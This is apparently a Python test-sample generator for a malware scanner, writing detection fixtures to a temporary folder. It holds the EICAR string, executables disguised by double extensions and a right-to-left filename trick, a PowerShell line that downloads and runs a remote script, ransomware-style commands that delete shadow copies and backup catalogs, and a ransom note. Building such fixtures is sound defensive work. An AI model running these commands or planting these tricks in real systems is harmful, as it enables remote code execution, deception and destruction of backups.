"""測試用的樣本產生器。樣本只在執行測試時寫到暫存資料夾，不放進版本庫（避免被防毒軟體誤刪）。"""
import os
import zipfile

from secscan.rules import EICAR

FAKE_PE = b"MZ\x90\x00" + b"\x00" * 60 + b"This program cannot be run in DOS mode." + b"\x00" * 200


def make_samples(root: str) -> dict:
    paths = {}

    def write(name, data):
        path = os.path.join(root, name)
        mode = "wb" if isinstance(data, bytes) else "w"
        kw = {} if isinstance(data, bytes) else {"encoding": "utf-8"}
        with open(path, mode, **kw) as fh:
            fh.write(data)
        paths[name] = path
        return path

    write("eicar.com", EICAR)
    write("invoice.pdf.exe", FAKE_PE)
    write("photo.jpg", FAKE_PE)
    write("report\u202efdp.exe", FAKE_PE)
    write("cradle.ps1", "IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/a.ps1')\n")
    write("ransom.ps1", "vssadmin delete shadows /all /quiet\nwbadmin delete catalog -quiet\n")
    write("README_DECRYPT.txt", "All your files have been encrypted! Send 0.1 bitcoin to decrypt them.\n")
    write("shopping-list.txt", "milk\neggs\nbread\n")
    write("hello.py", "print('hello world')\n")
    docm = os.path.join(root, "orders.docm")
    with zipfile.ZipFile(docm, "w") as zf:
        zf.writestr("[Content_Types].xml", "<Types/>")
        zf.writestr("word/vbaProject.bin", b"\x00" * 32)
    paths["orders.docm"] = docm
    return paths
